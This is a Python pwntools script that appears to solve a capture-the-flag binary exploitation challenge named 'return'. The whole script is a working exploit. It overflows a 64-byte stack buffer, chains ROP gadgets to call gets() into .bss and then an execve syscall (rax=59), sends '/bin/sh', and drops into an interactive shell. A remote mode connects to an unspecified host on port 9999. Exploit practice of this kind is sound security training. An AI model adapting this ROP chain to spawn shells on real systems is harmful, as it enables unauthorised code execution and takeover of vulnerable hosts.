from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./return"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()
"""
0x00000000004020a8 : pop rdi ; pop rbp ; ret
0x00000000004231bb : pop rax ; ret
0x0000000000413f47 : pop rdx ; ret 6
0x0000000000401280 : syscall
0x0000000000424666 : pop rsi ; ret
0x000000000046da0c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

"""
pop_rdi_rbp = 0x4020a8
bss = 0x4AC940
ret = 0x4251EB
pop_rax = 0x4231bb
pop_rdx = 0x46da0c
pop_rsi = 0x424666


payload = b"a"*64 + b"b"*8
payload += p64(ret)
payload += p64(pop_rdi_rbp)
payload += p64(bss)
payload += p64(0)
payload += p64(elf.sym["gets"])
payload += p64(pop_rdi_rbp)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)*5
payload += p64(pop_rax) 
payload += p64(59)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(0x401280)





ddebug("b * 0x4018e6\ncontinue\n")
io.sendline(payload)

pause()

io.sendline(b"/bin/sh\x00")
io.interactive()
